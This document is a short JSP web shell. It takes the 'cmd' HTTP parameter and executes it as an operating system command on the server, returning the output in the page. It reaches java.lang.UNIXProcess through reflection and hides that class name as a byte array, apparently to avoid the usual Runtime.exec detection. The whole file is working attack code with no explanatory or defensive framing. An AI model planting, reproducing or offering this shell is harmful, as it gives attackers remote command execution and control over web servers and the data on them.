<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<pre>
<%
    String[] cmd = request.getParameterValues("cmd");

    if (cmd != null) {
        Class clazz = Class.forName(new String(new byte[]{
                106, 97, 118, 97, 46, 108, 97, 110, 103, 46,
                85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115
        }));

        Constructor constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        byte[][] args = new byte[cmd.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = cmd[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        byte[] bytes  = cmd[0].getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;

        Object object = constructor.newInstance(
                result, argBlock, args.length,
                null, 1, null, new int[]{-1, -1, -1}, false
        );

        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        InputStream in = (InputStream) inMethod.invoke(object);
        int a = 0;
        byte[] b = new byte[1024];

        while ((a = in.read(b)) != -1) {
            out.println(new String(b, 0, a));
        }

        in.close();
    }
%>
</pre>